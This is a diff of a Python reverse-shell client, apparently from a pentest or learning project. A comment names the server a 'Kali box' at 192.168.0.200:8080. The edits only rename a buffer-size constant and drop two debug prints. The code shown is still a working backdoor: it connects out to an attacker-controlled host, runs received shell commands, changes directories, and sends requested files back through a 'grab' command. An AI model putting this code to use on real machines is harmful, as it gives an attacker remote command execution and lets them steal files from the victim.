@@ -12,7 +12,7 @@ import os
 #Kali box
 SERV_ADDRESS = ("192.168.0.200", 8080)
 state = True
-CHUNK = 1024
+SIZE = 1024
 
 def create_socket():
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -23,10 +23,10 @@ def transfer(conn, path):
     if os.path.exists(path):
         print("path ", path)
         with open(path, 'rb') as f:
-            chunk = f.read(CHUNK)
+            chunk = f.read(SIZE)
             while len(chunk) > 0:
                 conn.send(chunk)
-                chunk = f.read(CHUNK)
+                chunk = f.read(SIZE)
             conn.send('DONE'.encode())
     else:
         conn.send('File not found'.encode())
@@ -35,7 +35,7 @@ def try2connect(socket):
     global state, total
 
     while(True):
-        command = socket.recv(CHUNK)
+        command = socket.recv(SIZE)
         print("command %s" % command)
         if 'exit' in command.decode():
             socket.close()
@@ -50,8 +50,6 @@ def try2connect(socket):
             os.chdir(directory)
         elif "grab" in command.decode():
             grab, path = command.decode().split("*")
-            print("grab", grab)
-            print("path", path)
             transfer(socket, path)
         else:
             run_shell(socket, command)
